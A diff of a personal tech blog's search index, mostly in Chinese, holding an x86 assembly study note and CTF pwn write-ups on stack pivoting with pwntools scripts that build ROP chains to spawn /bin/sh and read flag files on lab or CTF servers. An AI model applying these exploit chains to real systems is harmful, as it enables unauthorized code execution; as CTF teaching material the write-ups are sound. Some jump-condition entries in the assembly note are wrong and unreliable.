@@ -1,6 +1,59 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Assembly part 2.</title>
+    <url>/2024/08/15/asm-1/</url>
+    <content><![CDATA[<h2 id="Basic-Instructions"><a href="#Basic-Instructions" class="headerlink" title="Basic Instructions"></a>Basic Instructions</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Program to show use of interrupts</span><br><span class="line">; Also, Hello World program !</span><br><span class="line">hello: DB &quot;Hello World&quot; ; store string</span><br><span class="line"></span><br><span class="line">; actual entry point of the program, must be present</span><br><span class="line">start:</span><br><span class="line">MOV AH, 0x13            ; move BIOS interrupt number in AH</span><br><span class="line">MOV CX, 11              ; move length of string in cx</span><br><span class="line">MOV BX, 0               ; mov 0 to bx, so we can move it to es</span><br><span class="line">MOV ES, BX              ; move segment start of string to es, 0</span><br><span class="line">MOV BP, OFFSET hello    ; move start offset of string in bp</span><br><span class="line">MOV DL, 0               ; start writing from col 0</span><br><span class="line">int 0x10                ; BIOS interrupt</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a>CMP</h3><h4 id="CMPX1-X2-JMP"><a href="#CMPX1-X2-JMP" class="headerlink" title="CMPX1,X2  JMP"></a>CMPX1,X2  <code>JMP</code></h4><ul>
+<li><strong>JE (Jump if Equal):</strong> Jumps if the Zero Flag (ZF) is set (<code>ZF = 1</code>).</li>
+<li><strong>JNE (Jump if Not Equal):</strong> Jumps if the Zero Flag (ZF) is not set (<code>ZF = 0</code>).</li>
+<li><strong>JZ (Jump if Zero):</strong> Jumps if the Zero Flag (ZF) is set (<code>ZF = 1</code>).</li>
+<li><strong>JNZ (Jump if Not Zero):</strong> Jumps if the Zero Flag (ZF) is not set (<code>ZF = 0</code>).</li>
+<li><strong>JS (Jump if Sign):</strong> Jumps if the Sign Flag (SF) is set (<code>SF = 1</code>).</li>
+<li><strong>JNS (Jump if Not Sign):</strong> Jumps if the Sign Flag (SF) is not set (<code>SF = 0</code>).</li>
+<li><strong>JC (Jump if Carry):</strong> Jumps if the Carry Flag (CF) is set (<code>CF = 1</code>).</li>
+<li><strong>JNC (Jump if Not Carry):</strong> Jumps if the Carry Flag (CF) is not set (<code>CF = 0</code>).</li>
+<li><strong>JO (Jump if Overflow):</strong> Jumps if the Overflow Flag (OF) is set (<code>OF = 1</code>).</li>
+<li><strong>JNO (Jump if Not Overflow):</strong> Jumps if the Overflow Flag (OF) is not set (<code>OF = 0</code>).</li>
+<li><strong>JA (Jump if Above):</strong> Jumps if (<code>CF = 0</code> and <code>ZF = 0</code>).</li>
+<li><strong>JAE (Jump if Above or Equal):</strong> Jumps if (<code>CF = 0</code>).</li>
+<li><strong>JNA (Jump if Not Above):</strong> Jumps if (<code>CF = 1</code> and <code>ZF = 1</code>).</li>
+<li><strong>JNAE (Jump if Not Above or Equal):</strong> Jumps if (<code>CF = 1</code>).</li>
+<li><strong>JG (Jump if Greater):</strong> Jumps if (<code>ZF = 0</code> and <code>SF = OF</code>).</li>
+<li><strong>JGE (Jump if Greater or Equal):</strong> Jumps if (<code>SF = OF</code>).</li>
+<li><strong>JNG (Jump if Not Greater):</strong> Jumps if (<code>ZF = 1</code> or <code>SF != OF</code>).</li>
+<li><strong>JNGE (Jump if Not Greater or Equal):</strong> Jumps if (<code>SF != OF</code>).</li>
+<li><strong>JB (Jump if Below):</strong> Jumps if (<code>CF = 1</code>).</li>
+<li><strong>JBE (Jump if Below or Equal):</strong> Jumps if (<code>CF = 1</code> or <code>ZF = 1</code>).</li>
+<li><strong>JNB (Jump if Not Below):</strong> Jumps if (<code>CF = 0</code>).</li>
+<li><strong>JNBE (Jump if Not Below or Equal):</strong> Jumps if (<code>CF = 0</code> and <code>ZF = 0</code>).</li>
+<li><strong>JL (Jump if Less):</strong> Jumps if (<code>SF != OF</code>).</li>
+<li><strong>JLE (Jump if Less or Equal):</strong> Jumps if (<code>SF != OF</code> or <code>ZF = 1</code>).</li>
+<li><strong>JNL (Jump if Not Less):</strong> Jumps if (<code>SF = OF</code>).</li>
+<li><strong>JNLE (Jump if Not Less or Equal):</strong> Jumps if (<code>SF = OF</code> and <code>ZF = 0</code>).</li>
+<li><strong>JP&#x2F;JPE (Jump if Parity&#x2F;Even Parity):</strong> Jumps if Parity Flag (PF) is set (<code>PF = 1</code>).</li>
+<li><strong>JNP&#x2F;JPO (Jump if Not Parity&#x2F;Odd Parity):</strong> Jumps if Parity Flag (PF) is not set (<code>PF = 0</code>).</li>
+</ul>
+<h3 id="Integer-Addition-and-Subtraction"><a href="#Integer-Addition-and-Subtraction" class="headerlink" title="Integer Addition and Subtraction"></a>Integer Addition and Subtraction</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">mov al, 5</span><br><span class="line">mov cl, 2</span><br><span class="line">add al,cl</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">mov dx, 0</span><br><span class="line">mov ax, 0083</span><br><span class="line">mov bx, 2</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">mov ah, 255</span><br><span class="line">mov bh, 254</span><br><span class="line">xor ah, bh</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>Operation List</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD X1,X2    ;將X1 X2的數字相加並存入X1中</span><br><span class="line">SUB X1,X2    ;同 上 ，只 是 變 減 法 MUL BXAX去乘BX</span><br><span class="line">INC X1     ;X1的數字加1 ，並放回X1 D E C X 1 同 上 ，但 變 減 1</span><br><span class="line">NEG X1     ;將X1的數字變為2的補數</span><br><span class="line">OR X1,X2     ;X1,X2 去做OR邏輯運算，並將結果放回X1</span><br><span class="line">AND X1,X2     ;同上只是去做AND邏輯運算</span><br><span class="line">TEST X1,X2     ;同上，他是去做AND邏輯運算但比較特殊的是他不會把結果存入X1中</span><br><span class="line">END     ;表示程式結束處 DB[字串，數值]去定義一個位元組的資料不影響旗標的程式=〉</span><br><span class="line">            ;移動資料的程式(註記碼) like: MOV AX,BX/POP AX/PUSH AX</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Exam"><a href="#Exam" class="headerlink" title="Exam"></a>Exam</h2><p><a class="link"   href="https://hackmd.io/54U7j1vaR7ebbLQtVb4FNQ" >EM1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://hackmd.io/cVT7YTEgRw22Vab8npsRqA" >EM2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <tags>
+        <tag>csie</tag>
+        <tag>asm</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AIS3 PreExam2024</title>
     <url>/2024/08/10/AIS3-PreExam2024/</url>
     <content><![CDATA[<blockquote>
@@ -76,59 +129,6 @@
 ]]></content>
       <tags>
         <tag>ais3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Assembly part 2.</title>
-    <url>/2024/08/15/asm-1/</url>
-    <content><![CDATA[<h2 id="Basic-Instructions"><a href="#Basic-Instructions" class="headerlink" title="Basic Instructions"></a>Basic Instructions</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Program to show use of interrupts</span><br><span class="line">; Also, Hello World program !</span><br><span class="line">hello: DB &quot;Hello World&quot; ; store string</span><br><span class="line"></span><br><span class="line">; actual entry point of the program, must be present</span><br><span class="line">start:</span><br><span class="line">MOV AH, 0x13            ; move BIOS interrupt number in AH</span><br><span class="line">MOV CX, 11              ; move length of string in cx</span><br><span class="line">MOV BX, 0               ; mov 0 to bx, so we can move it to es</span><br><span class="line">MOV ES, BX              ; move segment start of string to es, 0</span><br><span class="line">MOV BP, OFFSET hello    ; move start offset of string in bp</span><br><span class="line">MOV DL, 0               ; start writing from col 0</span><br><span class="line">int 0x10                ; BIOS interrupt</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="CMP"><a href="#CMP" class="headerlink" title="CMP"></a>CMP</h3><h4 id="CMPX1-X2-JMP"><a href="#CMPX1-X2-JMP" class="headerlink" title="CMPX1,X2  JMP"></a>CMPX1,X2  <code>JMP</code></h4><ul>
-<li><strong>JE (Jump if Equal):</strong> Jumps if the Zero Flag (ZF) is set (<code>ZF = 1</code>).</li>
-<li><strong>JNE (Jump if Not Equal):</strong> Jumps if the Zero Flag (ZF) is not set (<code>ZF = 0</code>).</li>
-<li><strong>JZ (Jump if Zero):</strong> Jumps if the Zero Flag (ZF) is set (<code>ZF = 1</code>).</li>
-<li><strong>JNZ (Jump if Not Zero):</strong> Jumps if the Zero Flag (ZF) is not set (<code>ZF = 0</code>).</li>
-<li><strong>JS (Jump if Sign):</strong> Jumps if the Sign Flag (SF) is set (<code>SF = 1</code>).</li>
-<li><strong>JNS (Jump if Not Sign):</strong> Jumps if the Sign Flag (SF) is not set (<code>SF = 0</code>).</li>
-<li><strong>JC (Jump if Carry):</strong> Jumps if the Carry Flag (CF) is set (<code>CF = 1</code>).</li>
-<li><strong>JNC (Jump if Not Carry):</strong> Jumps if the Carry Flag (CF) is not set (<code>CF = 0</code>).</li>
-<li><strong>JO (Jump if Overflow):</strong> Jumps if the Overflow Flag (OF) is set (<code>OF = 1</code>).</li>
-<li><strong>JNO (Jump if Not Overflow):</strong> Jumps if the Overflow Flag (OF) is not set (<code>OF = 0</code>).</li>
-<li><strong>JA (Jump if Above):</strong> Jumps if (<code>CF = 0</code> and <code>ZF = 0</code>).</li>
-<li><strong>JAE (Jump if Above or Equal):</strong> Jumps if (<code>CF = 0</code>).</li>
-<li><strong>JNA (Jump if Not Above):</strong> Jumps if (<code>CF = 1</code> and <code>ZF = 1</code>).</li>
-<li><strong>JNAE (Jump if Not Above or Equal):</strong> Jumps if (<code>CF = 1</code>).</li>
-<li><strong>JG (Jump if Greater):</strong> Jumps if (<code>ZF = 0</code> and <code>SF = OF</code>).</li>
-<li><strong>JGE (Jump if Greater or Equal):</strong> Jumps if (<code>SF = OF</code>).</li>
-<li><strong>JNG (Jump if Not Greater):</strong> Jumps if (<code>ZF = 1</code> or <code>SF != OF</code>).</li>
-<li><strong>JNGE (Jump if Not Greater or Equal):</strong> Jumps if (<code>SF != OF</code>).</li>
-<li><strong>JB (Jump if Below):</strong> Jumps if (<code>CF = 1</code>).</li>
-<li><strong>JBE (Jump if Below or Equal):</strong> Jumps if (<code>CF = 1</code> or <code>ZF = 1</code>).</li>
-<li><strong>JNB (Jump if Not Below):</strong> Jumps if (<code>CF = 0</code>).</li>
-<li><strong>JNBE (Jump if Not Below or Equal):</strong> Jumps if (<code>CF = 0</code> and <code>ZF = 0</code>).</li>
-<li><strong>JL (Jump if Less):</strong> Jumps if (<code>SF != OF</code>).</li>
-<li><strong>JLE (Jump if Less or Equal):</strong> Jumps if (<code>SF != OF</code> or <code>ZF = 1</code>).</li>
-<li><strong>JNL (Jump if Not Less):</strong> Jumps if (<code>SF = OF</code>).</li>
-<li><strong>JNLE (Jump if Not Less or Equal):</strong> Jumps if (<code>SF = OF</code> and <code>ZF = 0</code>).</li>
-<li><strong>JP&#x2F;JPE (Jump if Parity&#x2F;Even Parity):</strong> Jumps if Parity Flag (PF) is set (<code>PF = 1</code>).</li>
-<li><strong>JNP&#x2F;JPO (Jump if Not Parity&#x2F;Odd Parity):</strong> Jumps if Parity Flag (PF) is not set (<code>PF = 0</code>).</li>
-</ul>
-<h3 id="Integer-Addition-and-Subtraction"><a href="#Integer-Addition-and-Subtraction" class="headerlink" title="Integer Addition and Subtraction"></a>Integer Addition and Subtraction</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">mov al, 5</span><br><span class="line">mov cl, 2</span><br><span class="line">add al,cl</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">mov dx, 0</span><br><span class="line">mov ax, 0083</span><br><span class="line">mov bx, 2</span><br><span class="line">div bx</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:</span><br><span class="line">mov ah, 255</span><br><span class="line">mov bh, 254</span><br><span class="line">xor ah, bh</span><br></pre></td></tr></table></figure></div>
-
-<ul>
-<li>Operation List</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ADD X1,X2    ;將X1 X2的數字相加並存入X1中</span><br><span class="line">SUB X1,X2    ;同 上 ，只 是 變 減 法 MUL BXAX去乘BX</span><br><span class="line">INC X1     ;X1的數字加1 ，並放回X1 D E C X 1 同 上 ，但 變 減 1</span><br><span class="line">NEG X1     ;將X1的數字變為2的補數</span><br><span class="line">OR X1,X2     ;X1,X2 去做OR邏輯運算，並將結果放回X1</span><br><span class="line">AND X1,X2     ;同上只是去做AND邏輯運算</span><br><span class="line">TEST X1,X2     ;同上，他是去做AND邏輯運算但比較特殊的是他不會把結果存入X1中</span><br><span class="line">END     ;表示程式結束處 DB[字串，數值]去定義一個位元組的資料不影響旗標的程式=〉</span><br><span class="line">            ;移動資料的程式(註記碼) like: MOV AX,BX/POP AX/PUSH AX</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="Exam"><a href="#Exam" class="headerlink" title="Exam"></a>Exam</h2><p><a class="link"   href="https://hackmd.io/54U7j1vaR7ebbLQtVb4FNQ" >EM1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://hackmd.io/cVT7YTEgRw22Vab8npsRqA" >EM2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-]]></content>
-      <tags>
-        <tag>csie</tag>
-        <tag>asm</tag>
       </tags>
   </entry>
   <entry>
@@ -377,7 +377,7 @@
 
 <hr>
 <blockquote>
-<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#115;&#x74;&#100;&#x6f;&#x75;&#116;&#64;&#71;&#76;&#73;&#66;&#67;&#x5f;&#x32;&#46;&#x32;&#46;&#53;" >&#115;&#x74;&#100;&#x6f;&#x75;&#116;&#64;&#71;&#76;&#73;&#66;&#67;&#x5f;&#x32;&#46;&#x32;&#46;&#53; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
+<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#115;&#x74;&#x64;&#111;&#117;&#116;&#64;&#71;&#76;&#x49;&#66;&#x43;&#95;&#50;&#46;&#x32;&#x2e;&#53;" >&#115;&#x74;&#x64;&#111;&#117;&#116;&#64;&#71;&#76;&#x49;&#66;&#x43;&#95;&#50;&#46;&#x32;&#x2e;&#53; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
 </blockquote>
 <p><img  
                      lazyload
@@ -1255,36 +1255,23 @@
       </tags>
   </entry>
   <entry>
-    <title>How to use gdb-WriteUp</title>
-    <url>/2024/08/09/pwn/</url>
-    <content><![CDATA[<h2 id="How-to-use-gdb"><a href="#How-to-use-gdb" class="headerlink" title="How to use gdb"></a>How to use gdb</h2><blockquote>
-<p>因為我寫到srop的lab才發現我不會用gdb，所以這邊趕快補一下🤧</p>
+    <title>Stack Pivoting WriteUp</title>
+    <url>/2024/08/09/pwn-5/</url>
+    <content><![CDATA[<h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><blockquote>
+<p>前言:在控制rip後沒有足夠的stack空間讓我們推rop chain這時就需要stack pivoting技術</p>
 </blockquote>
-<h3 id="open-gdb"><a href="#open-gdb" class="headerlink" title="open gdb"></a>open gdb</h3><ul>
-<li><p>attach <code>&lt;pid&gt;</code></p>
-</li>
-<li><p>pwntools open gdb</p>
-  <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;+h&#x27;</span>] <span class="comment"># 要先開tmux</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(r) <span class="comment"># 在想要的位置開gdb</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-<h3 id="調適"><a href="#調適" class="headerlink" title="調適"></a>調適</h3><p>gdb <strong>Commands</strong></p>
-<ul>
-<li>r &#x3D; run：運行程式。如果程式已經在運行，輸入 r 會重新啟動程式。</li>
-<li>b &#x3D; break：設置斷點，通常在調試pwn時用來在特定的記憶體地址處停住程式，例如 b 0x400908 或 b *main+&lt;行號&gt;。</li>
-<li>c &#x3D; continue：繼續執行程式，直到遇到下一個斷點。</li>
-<li>n &#x3D; next：執行下一行指令。</li>
-<li>ni &#x3D; nexti：執行下一條指令，這是真正的下一個組譯指令。</li>
-<li>s &#x3D; step：單步執行程式，當進入到不同的函數時會停下來，一般會在呼叫 call 之後停在被呼叫函數的開始位置。</li>
-<li>d &#x3D; delete：刪除斷點，後面可以跟數字來指定刪除哪個斷點。如果不帶參數，則刪除全部斷點。</li>
-<li>x：查看記憶體內容。</li>
-<li>xinfo: 指定地址的值及其對應的內存內容。</li>
-</ul>
-<blockquote>
-<p>補完發現好想沒什麼好補的，剩下也是靠經驗🤧</p>
-</blockquote>
+<p>蓋到buf結束後，塞入<code>leave;ret;</code>gadget，讓rbp跳到我們指定的stack位置，然後就會出現<strong>魔術大空間</strong></p>
+<p>圖片來自LYS投影片<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/pwn-1.png"
+                      alt="Alt text"
+                ></p>
+<h2 id="Ais3-lys-rop1"><a href="#Ais3-lys-rop1" class="headerlink" title="Ais3-lys-rop1"></a>Ais3-lys-rop1</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;35.229.243.81&quot; ,10102)</span></span><br><span class="line">r = process(<span class="string">&#x27;../lab_rop2/rop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x000000000044fd87</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x0000000000485bab</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f4f</span></span><br><span class="line">pop_rsi =<span class="number">0x0000000000409f7e</span></span><br><span class="line">buf = <span class="number">0x4c7300</span></span><br><span class="line">syscall = <span class="number">0x0000000000401d04</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4017ee</span></span><br><span class="line"></span><br><span class="line">chain = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">chain += p64(pop_rax) + p64(<span class="number">59</span>)</span><br><span class="line">chain += p64(pop_rsi) + p64(<span class="number">0x0</span>)</span><br><span class="line">chain += p64(pop_rdi) + p64(buf)</span><br><span class="line">chain += p64(pop_rdx_rbx) + p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">chain += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">p1 += p64(buf)</span><br><span class="line">p1 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name? &#x27;</span>,chain)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln: &#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ncku-ctf-pivoting"><a href="#ncku-ctf-pivoting" class="headerlink" title="ncku-ctf-pivoting"></a>ncku-ctf-pivoting</h2><p>這邊上下兩題幾乎一樣只有gadget需要重找</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./chal&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.nckuctf.org&quot;</span>,<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401f1f</span></span><br><span class="line">pop_rax = <span class="number">0x44ff47</span></span><br><span class="line">pop_rsi = <span class="number">0x409f8e</span> </span><br><span class="line">pop_rdx_rbx = <span class="number">0x485ccb</span> </span><br><span class="line">syscall = <span class="number">0x401cd4</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x4c7220</span></span><br><span class="line">leave_ret = <span class="number">0x401877</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    name,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pri = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    name,</span><br><span class="line">    leave_ret,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,pri)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 ]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
       <tags>
         <tag>pwn</tag>
       </tags>
@@ -1443,232 +1430,6 @@
 ]]></content>
       <tags>
         <tag>rev</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Stack Pivoting WriteUp</title>
-    <url>/2024/08/09/pwn-5/</url>
-    <content><![CDATA[<h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><blockquote>
-<p>前言:在控制rip後沒有足夠的stack空間讓我們推rop chain這時就需要stack pivoting技術</p>
-</blockquote>
-<p>蓋到buf結束後，塞入<code>leave;ret;</code>gadget，讓rbp跳到我們指定的stack位置，然後就會出現<strong>魔術大空間</strong></p>
-<p>圖片來自LYS投影片<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/pwn-1.png"
-                      alt="Alt text"
-                ></p>
-<h2 id="Ais3-lys-rop1"><a href="#Ais3-lys-rop1" class="headerlink" title="Ais3-lys-rop1"></a>Ais3-lys-rop1</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(&quot;35.229.243.81&quot; ,10102)</span></span><br><span class="line">r = process(<span class="string">&#x27;../lab_rop2/rop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x000000000044fd87</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x0000000000485bab</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f4f</span></span><br><span class="line">pop_rsi =<span class="number">0x0000000000409f7e</span></span><br><span class="line">buf = <span class="number">0x4c7300</span></span><br><span class="line">syscall = <span class="number">0x0000000000401d04</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4017ee</span></span><br><span class="line"></span><br><span class="line">chain = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">chain += p64(pop_rax) + p64(<span class="number">59</span>)</span><br><span class="line">chain += p64(pop_rsi) + p64(<span class="number">0x0</span>)</span><br><span class="line">chain += p64(pop_rdi) + p64(buf)</span><br><span class="line">chain += p64(pop_rdx_rbx) + p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">chain += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">p1 += p64(buf)</span><br><span class="line">p1 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name? &#x27;</span>,chain)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln: &#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h2 id="ncku-ctf-pivoting"><a href="#ncku-ctf-pivoting" class="headerlink" title="ncku-ctf-pivoting"></a>ncku-ctf-pivoting</h2><p>這邊上下兩題幾乎一樣只有gadget需要重找</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./chal&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.nckuctf.org&quot;</span>,<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401f1f</span></span><br><span class="line">pop_rax = <span class="number">0x44ff47</span></span><br><span class="line">pop_rsi = <span class="number">0x409f8e</span> </span><br><span class="line">pop_rdx_rbx = <span class="number">0x485ccb</span> </span><br><span class="line">syscall = <span class="number">0x401cd4</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x4c7220</span></span><br><span class="line">leave_ret = <span class="number">0x401877</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    name,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pri = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    name,</span><br><span class="line">    leave_ret,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,pri)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NTTU 伺服器原理 WriteUp-2</title>
-    <url>/2024/08/09/server-1/</url>
-    <content><![CDATA[<h2 id="Ansible"><a href="#Ansible" class="headerlink" title="Ansible"></a>Ansible</h2><h3 id="Docs"><a href="#Docs" class="headerlink" title="Docs"></a>Docs</h3><ul>
-<li><code>$ansible-navigator doc -l</code></li>
-<li><code>ansible-navigator doc &lt;ansible.builtin.dnf&gt;</code></li>
-</ul>
